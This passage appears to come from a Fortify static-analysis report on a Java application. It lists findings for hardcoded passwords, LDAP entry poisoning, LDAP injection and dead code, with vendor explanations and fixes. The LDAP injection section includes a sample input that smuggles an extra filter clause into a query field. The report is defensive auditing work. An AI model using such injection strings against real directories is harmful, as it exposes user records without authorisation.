Example 3: The following code demonstrates how to integrate SQLCipher into an Android application after downloading the necessary binaries, and store credentials into the database file.

import net.sqlcipher.database.SQLiteDatabase;
...
  SQLiteDatabase.loadLibs(this);
  File dbFile = getDatabasePath("credentials.db");
  dbFile.mkdirs();
  dbFile.delete();
  SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, "credentials", null);
  db.execSQL("create table credentials(u, p)");
  db.execSQL("insert into credentials(u, p) values(?, ?)", new Object[]{username, password});
...


Note that references to android.database.sqlite.SQLiteDatabase are substituted with those of net.sqlcipher.database.SQLiteDatabase.

To enable encryption on the WebView store, you must recompile WebKit with the sqlcipher.so library.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. You can use the Fortify Java Annotations FortifyPassword and FortifyNotPassword to indicate which fields and variables represent passwords.

2. To identify null, empty, or hardcoded passwords, default rules only consider fields and variables that contain the word password. However, the Fortify Custom Rules Editor provides the Password Management wizard that makes it easy to create rules for detecting password management issues on custom-named fields and variables.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>39</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="60D06A9BF68444276BBB7D7E5CB18E7B" ruleID="C1BBF18D-B40E-466B-A4B1-B0BF242830EE">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded passwords can compromise system security in a way that is not easy to remedy.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CNSIConstants.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIConstants.java</FilePath>
<LineStart>3362</LineStart>
<Snippet>    public static final String REPORT_SIGN_ON = "signon";

    public static final String REPORT_SIGN_ON_PWD = "password";

    public static final String REPORT_PROMPT = "cognospmain";</Snippet>
<TargetFunction>FieldAccess: REPORT_SIGN_ON_PWD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0F985A683CD4019C01721F2086DA1032" ruleID="C1BBF18D-B40E-466B-A4B1-B0BF242830EE">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded passwords can compromise system security in a way that is not easy to remedy.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>6479</LineStart>
<Snippet>    public static final String USER_ACCT_SID = "USER_ACCT_SID";
    public static final String PWD_HINT = "PWD_HINT";
    public static final String PWD_HINT_ANSWR  = "PWD_HINT_ANSWR";

    public static final String USER_LOGIN_ID  = "USER_LOGIN_ID";</Snippet>
<TargetFunction>FieldAccess: PWD_HINT_ANSWR()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="46A39DB5E3B61D8533A46C80B60946C8" ruleID="7CDF198E-B1CF-457A-AD06-E8015C73DC27">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded passwords can compromise system security in a way that is not easy to remedy.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>6485</LineStart>
<Snippet>    public static final String MODIFIED_DATE  = "MODIFIED_DATE";
    public static final String MODIFIED_BY  = "MODIFIED_BY";
    public static final String PWD="PASSWORD";
    public static final String USER_TYPE_CID="USER_TYPE_CID";
</Snippet>
<TargetFunction>FieldAccess: PWD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="42C0E92D383EEC55DE979AEF868CBB25" ruleID="C1BBF18D-B40E-466B-A4B1-B0BF242830EE">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded passwords can compromise system security in a way that is not easy to remedy.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CNSIConstants.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIConstants.java</FilePath>
<LineStart>3148</LineStart>
<Snippet>
    /* Variable to hold the property for Guest User id */
    public static final String PROP_GUEST_USER_PWD = "Password";

    /* Variable to hold the property for Common role sids */</Snippet>
<TargetFunction>FieldAccess: PROP_GUEST_USER_PWD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8AF53D8FD7E0C65587B0C93E1F43E141" ruleID="C1BBF18D-B40E-466B-A4B1-B0BF242830EE">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded passwords can compromise system security in a way that is not easy to remedy.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CNSIDataDictionary.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIDataDictionary.java</FilePath>
<LineStart>6478</LineStart>
<Snippet>    public static final String TABLE_NAME = "USER_ACCOUNT";
    public static final String USER_ACCT_SID = "USER_ACCT_SID";
    public static final String PWD_HINT = "PWD_HINT";
    public static final String PWD_HINT_ANSWR  = "PWD_HINT_ANSWR";
</Snippet>
<TargetFunction>FieldAccess: PWD_HINT()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="37">
                        <groupTitle>LDAP Entry Poisoning</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>An application that performs an object-returning LDAP search will allow attackers to control the LDAP response to run arbitrary code on the server.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>An attacker able to tamper with an LDAP response, either by modifying the entry at rest or by intercepting and modifying the response on the fly (man-in-the-middle attack) will be able to inject special Java attributes into the LDAP entry. When performing an object-returning search, the Java attributes are decoded as Java objects using Java deserialization or JNDI dereference allowing attackers to gain remote code execution on the application server performing the search.

The application performs an object-returning search by setting the returningObjectFlag to true on the javax.naming.directory.SearchControls instance passed to the search method or by using a library function that sets this flag on its behalf.

Example 1: The following code performs an object-returning search since the Spring LdapTemplate.search() function forces an object-returning search when passed a ContextMapper instance.


private static class PersonContextMapper implements ContextMapper {
    public Person mapFromContext(Object ctx) {
        DirContextAdapter context = (DirContextAdapter)ctx;
        Person p = new Person();
        p.setFullName(context.getStringAttribute("cn"));
        p.setLastName(context.getStringAttribute("sn"));
        p.setDescription(context.getStringAttribute("description"));
        return p;
    }
}

public List&lt;Person&gt; findByPrimaryKey(String name, String company, String country) {
    SearchControls ctls = new SearchControls();
    String getAttrs[] = { "cn", "sn","description" };
    ctls.setReturningAttributes(getAttrs);

    Name dn = buildDn(name, company, country);
    String filter = "objectClass=inetorgPerson";

    List&lt;Person&gt; p = null;
    try {
        p = ldapTemplate.search(dn, filter, ctls, new PersonContextMapper());
    } catch (NamingException e) {
        Log.error("Error retrieving LDAP attributes");
    }

    return p;
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>If not using LDAP to store Java objects, do not perform object-returning searches just for the benefit of getting a DirContext wrapper representing the result entry. Fetch the attributes using a regular search.

There are certain APIs that always enforce the usage of object-returning searches such as, for example, the Spring LdapTemplate.search() methods taking ContextMapper instances as arguments. There is no secure usage of these APIs and they should be avoided. Consider using an AttributesMapper instead to avoid decoding returned attributes as Java objects.

Example 2: The following code performs a regular search (not object-returning) and uses the returned attributes to instantiate the Person object.


private static class PersonAttributesMapper implements AttributesMapper {
    public Person mapFromAttributes(Attributes attrs) throws NamingException {
        Person p = new Person();
        p.setFullName(attrs.get("cn"));
        p.setLastName(attrs.get("sn"));
        p.setDescription(attrs.get("description"));
        return p;
    }
}

public List&lt;Person&gt; findByPrimaryKey(String name, String company, String country) {
    SearchControls ctls = new SearchControls();
    String getAttrs[] = { "cn", "sn","description" };
    ctls.setReturningAttributes(getAttrs);

    Name dn = buildDn(name, company, country);
    String filter = "objectClass=inetorgPerson";

    List&lt;Person&gt; p = null;
    try {
        p = ldapTemplate.search(dn, filter, ctls, new PersonAttributesMapper());
    } catch (NamingException e) {
        Log.error("Error retrieving LDAP attributes");
    }

    return p;
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>37</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="1CC00AF58BD0032B6E1903F626104D3D" ruleID="A5492B51-9F8C-4096-A4DD-37BD4253DB06">
                            <Category>LDAP Entry Poisoning</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>An application that performs an object-returning LDAP search will allow attackers to control the LDAP response to run arbitrary code on the server.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>101</LineStart>
<Snippet>	public List getDomainsAssociatedToProfile(String profilename){		
		EqualsFilter filter = new EqualsFilter("sn",profilename);
		return ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_PROFILE"), filter.encode(),new AssociationContextMapper());
	}
	</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B9A826BEA5892264A83F01698A1C7EA6" ruleID="A5492B51-9F8C-4096-A4DD-37BD4253DB06">
                            <Category>LDAP Entry Poisoning</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>An application that performs an object-returning LDAP search will allow attackers to control the LDAP response to run arbitrary code on the server.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>78</LineStart>
<Snippet>			return new CNSIList();
		}else{
			return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), orfilter.encode(), getContextMapper());
		}						
	}</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="63A608E6BAC4DF3283738E0705473FFC" ruleID="A5492B51-9F8C-4096-A4DD-37BD4253DB06">
                            <Category>LDAP Entry Poisoning</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>An application that performs an object-returning LDAP search will allow attackers to control the LDAP response to run arbitrary code on the server.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>96</LineStart>
<Snippet>			return new CNSIList();
		}else{
			return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), orfilter.encode(), getContextMapper());
		}
	}</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6D1D5E340076FE78361F2D4B1E207406" ruleID="A5492B51-9F8C-4096-A4DD-37BD4253DB06">
                            <Category>LDAP Entry Poisoning</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>An application that performs an object-returning LDAP search will allow attackers to control the LDAP response to run arbitrary code on the server.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>67</LineStart>
<Snippet>	public List getDomainsAssociatedToUser(String userloginid){
		EqualsFilter filter = new EqualsFilter("sn",userloginid);
		List l_lstAssociated= ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_USER"), filter.encode(),new AssociationContextMapper());
		
		OrFilter orfilter = new OrFilter();</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D88FB6071A69E791F38BDEDCB90D313B" ruleID="A5492B51-9F8C-4096-A4DD-37BD4253DB06">
                            <Category>LDAP Entry Poisoning</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>An application that performs an object-returning LDAP search will allow attackers to control the LDAP response to run arbitrary code on the server.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>63</LineStart>
<Snippet>	public List getAllDomains(){
		EqualsFilter filter = new EqualsFilter("objectclass", "organizationalUnit");
		return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), filter.encode(), getContextMapper());
	}
	public List getDomainsAssociatedToUser(String userloginid){</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="33">
                        <groupTitle>LDAP Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getAllDomains() invokes a dynamically generated LDAP filter with potentially unvalidated input, which could allow an attacker to modify the statement's meaning.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>LDAP injection errors occur when:

1.	Data enters a program from an untrusted source.

In this case, Fortify Static Code Analyzer could not determine that the source of the data is trusted.

2.	The data is used to dynamically construct an LDAP filter.

Example 1: The following code dynamically constructs and executes an LDAP query that retrieves records for all the employees who report to a given manager. The manager's name is read from an HTTP request, and is therefore untrusted.


...
DirContext ctx = new InitialDirContext(env);

String managerName = request.getParameter("managerName");

//retrieve all of the employees who report to a manager

String filter = "(manager=" + managerName + ")";

NamingEnumeration employees = ctx.search("ou=People,dc=example,dc=com",
        			                 filter);
...


Under normal conditions, such as searching for employees who report to the manager John Smith, the filter that this code executes will look like the following:


(manager=Smith, John)


However, because the filter is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if managerName does not contain any LDAP meta characters. If an attacker enters the string Hacker, Wiley)(|(objectclass=*) for managerName, then the query becomes the following:


(manager=Hacker, Wiley)(|(objectclass=*))


Based on the permissions with which the query is executed, the addition of the |(objectclass=*) condition causes the filter to match against all entries in the directory, and allows the attacker to retrieve information about the entire pool of users. Depending on the permissions with which the LDAP query is performed, the breadth of this attack may be limited, but if the attacker may control the command structure of the query, such an attack can at least affect all records that the user the LDAP query is executed as can access.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>The root cause of LDAP injection vulnerabilities is the ability of an attacker to supply LDAP metacharacters that change the meaning of the LDAP query. When an LDAP filter is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data.

To prevent an attacker from violating the programmer's expectations, use a whitelist to ensure that user-controlled values used in an LDAP query are composed from only the expected set of characters and do not contain any LDAP metacharacters given the context in which they are used. If the domain of a user-controlled value requires that it contain LDAP metacharacters, use an appropriate encoding mechanism to remove their significance within the LDAP query.

Example 2: The previous example can be rewritten to use the Spring framework EqualsFilter class to construct a properly encoded filter string that preserves that statement's command structure, regardless of any LDAP metacharacters present in the request parameter.


...
DirContext ctx = new InitialDirContext(env);

String managerName = request.getParameter("managerName");

//retrieve all of the employees who report to a manager

EqualsFilter filter = new EqualsFilter("manager", managerName);

NamingEnumeration employees = ctx.search("ou=People,dc=example,dc=com",
        			                 filter.toString());
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>33</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="354C744891715061335AED022440CF0C" ruleID="CD1D7135-5574-494A-A27C-0AF4B7EF18B7">
                            <Category>LDAP Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getDomainsAssociatedToUser() invokes a dynamically generated LDAP filter with potentially unvalidated input, which could allow an attacker to modify the statement's meaning.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>67</LineStart>
<Snippet>	public List getDomainsAssociatedToUser(String userloginid){
		EqualsFilter filter = new EqualsFilter("sn",userloginid);
		List l_lstAssociated= ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_USER"), filter.encode(),new AssociationContextMapper());
		
		OrFilter orfilter = new OrFilter();</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="54B80C36289A8424F1E39FB7286E87CF" ruleID="CD1D7135-5574-494A-A27C-0AF4B7EF18B7">
                            <Category>LDAP Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getDomainsToAssociateToUser() invokes a dynamically generated LDAP filter with potentially unvalidated input, which could allow an attacker to modify the statement's meaning.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>96</LineStart>
<Snippet>			return new CNSIList();
		}else{
			return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), orfilter.encode(), getContextMapper());
		}
	}</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="614CC176081BCD69D7AB82D464D15553" ruleID="CD1D7135-5574-494A-A27C-0AF4B7EF18B7">
                            <Category>LDAP Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getDomainsAssociatedToUser() invokes a dynamically generated LDAP filter with potentially unvalidated input, which could allow an attacker to modify the statement's meaning.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>78</LineStart>
<Snippet>			return new CNSIList();
		}else{
			return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), orfilter.encode(), getContextMapper());
		}						
	}</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="268999B2F4140B2B60229408F3185475" ruleID="CD1D7135-5574-494A-A27C-0AF4B7EF18B7">
                            <Category>LDAP Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getAllDomains() invokes a dynamically generated LDAP filter with potentially unvalidated input, which could allow an attacker to modify the statement's meaning.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>63</LineStart>
<Snippet>	public List getAllDomains(){
		EqualsFilter filter = new EqualsFilter("objectclass", "organizationalUnit");
		return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), filter.encode(), getContextMapper());
	}
	public List getDomainsAssociatedToUser(String userloginid){</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7CD223EF321B25A768161C7F96345539" ruleID="CD1D7135-5574-494A-A27C-0AF4B7EF18B7">
                            <Category>LDAP Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getDomainsAssociatedToProfile() invokes a dynamically generated LDAP filter with potentially unvalidated input, which could allow an attacker to modify the statement's meaning.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>101</LineStart>
<Snippet>	public List getDomainsAssociatedToProfile(String profilename){		
		EqualsFilter filter = new EqualsFilter("sn",profilename);
		return ldapTemplate.search(new DistinguishedName("cn=DOMAIN_X_PROFILE"), filter.encode(),new AssociationContextMapper());
	}
	</Snippet>
<TargetFunction>search()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="32">
                        <groupTitle>Dead Code: Expression is Always true</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The expression at DbUtilImpl.java line 3117 will always evaluate to true.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>This expression will always evaluate to true; the program could be rewritten in a simpler form. The nearby code may be present for debugging purposes, or it may not have been maintained along with the rest of the program. The expression may also be indicative of a bug earlier in the method.

Example 1: The following method never sets the variable secondCall after initializing it to true. (The variable firstCall is mistakenly used twice.)  The result is that the expression firstCall || secondCall will always evaluate to true, so setUpForCall() will always be invoked.


public void setUpCalls() {
  boolean firstCall = true;
  boolean secondCall = true;

  if (fCall &lt; 0) {
    cancelFCall();
    firstCall = false;
  }
  if (sCall &lt; 0) {
    cancelSCall();
    firstCall = false;
  }

  if (firstCall || secondCall) {
    setUpForCall();
  }
}


Example 2: The following method tries to check the variables firstCall and secondCall. (The variable firstCall is mistakenly set to true instead of being checked.)  The result is that the first part of the expression firstCall = true &amp;&amp; secondCall == true will always evaluate to true.


public void setUpCalls() {
  boolean firstCall = false;
  boolean secondCall = false;

  if (fCall &gt; 0) {
    setUpFCall();
    firstCall = true;
  }
  if (sCall &gt; 0) {
    setUpSCall();
    secondCall = true;
  }

  if (firstCall = true &amp;&amp; secondCall == true) {
    setUpDualCall();
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>In general, you should repair or remove unused code. It causes additional complexity and maintenance burden without contributing to the functionality of the program.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>32</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="D712E3758BF02B82A4F78A154DB3A4A9" ruleID="0C82D0B5-1B23-4D56-B38E-F6263A454766">
                            <Category>Dead Code: Expression is Always true</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at CommentTag.java line 148 will always evaluate to true.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommentTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/CommentTag.java</FilePath>
<LineStart>148</LineStart>
<Snippet>        	else
        	{
        		if(b_sSecurityStr != null &amp;&amp; ( b_sSecurityStr.equals(HTMLTagConstants.ENABLED) 
	                      || b_sSecurityStr.equals(HTMLTagConstants.DISABLED)))
				{</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4F1C51A67E0D80E086AFAD0DA256E01F" ruleID="0C82D0B5-1B23-4D56-B38E-F6263A454766">
                            <Category>Dead Code: Expression is Always true</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at CheckBoxTag.java line 153 will always evaluate to true.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CheckBoxTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/CheckBoxTag.java</FilePath>
<LineStart>153</LineStart>
<Snippet>        super.doStartTag(false);

        if (initializeResources)
            release();
</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A72C25476A2C3227A980E00A413BCD98" ruleID="0C82D0B5-1B23-4D56-B38E-F6263A454766">
                            <Category>Dead Code: Expression is Always true</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at DbUtilImpl.java line 3117 will always evaluate to true.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>3117</LineStart>
<Snippet>        if (p_sSequenceName != null || p_sSequenceColumn != null)
        {
            if (p_sSequenceName == null || p_sSequenceColumn == null)
            {
                throw new InvalidArguementException(</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D712E3758BF02B82A4F78A154DB3A4A8" ruleID="0C82D0B5-1B23-4D56-B38E-F6263A454766">
                            <Category>Dead Code: Expression is Always true</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at CommentTag.java line 142 will always evaluate to true.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommentTag.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/CommentTag.java</FilePath>
<LineStart>142</LineStart>
<Snippet>        	// get the security string. If NotAccesible then display the NA image
        	String b_sSecurityStr = getSecurityString();
        	if(b_sSecurityStr != null &amp;&amp; b_sSecurityStr.equals(HTMLTagConstants.NOT_ACCESSIBLE))
        	{
        		pageContext.getOut().println(super.displayNoAccessImage());</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="97994114D0DE35160B051424874E058D" ruleID="0C82D0B5-1B23-4D56-B38E-F6263A454766">
                            <Category>Dead Code: Expression is Always true</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The expression at DbUtilImpl.java line 3117 will always evaluate to true.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>3117</LineStart>
<Snippet>        if (p_sSequenceName != null || p_sSequenceColumn != null)
        {
            if (p_sSequenceName == null || p_sSequenceColumn == null)
            {
                throw new InvalidArguementException(</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="31">
                        <groupTitle>Dead Code: Unused Method</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method isPageHasChildCtrls() in PagePgCtrlWithChildCacheManager.java is not reachable from any method outside the class. It is dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>This method is never called or is only called from other dead code.

Example 1: In the following class, the method doWork() can never be called.


public class Dead {
  private void doWork() {
    System.out.println("doing work");
  }
  public static void main(String[] args) {
    System.out.println("running Dead");
  }
}


Example 2: In the following class, two private methods call each other, but since neither one is ever invoked from anywhere else, they are both dead code.


public class DoubleDead {
  private void doTweedledee() {
    doTweedledumb();
  }
  private void doTweedledumb() {
    doTweedledee();
  }
  public static void main(String[] args) {
    System.out.println("running DoubleDead");
  }
}


(In this case it is a good thing that the methods are dead: invoking either one would cause an infinite loop.)</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>A dead method may indicate a bug in dispatch code.

Example 3: If method is flagged as dead named getWitch() in a class that also contains the following dispatch method, it may be because of a copy-and-paste error. The 'w' case should return getWitch() not getMummy().


public ScaryThing getScaryThing(char st) {
  switch(st) {
    case 'm':
      return getMummy();
    case 'w':
      return getMummy();
    default:
      return getBlob();
  }
}


In general, you should repair or remove dead code. To repair dead code, execute the dead code directly or indirectly through a public method. Dead code causes additional complexity and maintenance burden without contributing to the functionality of the program.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
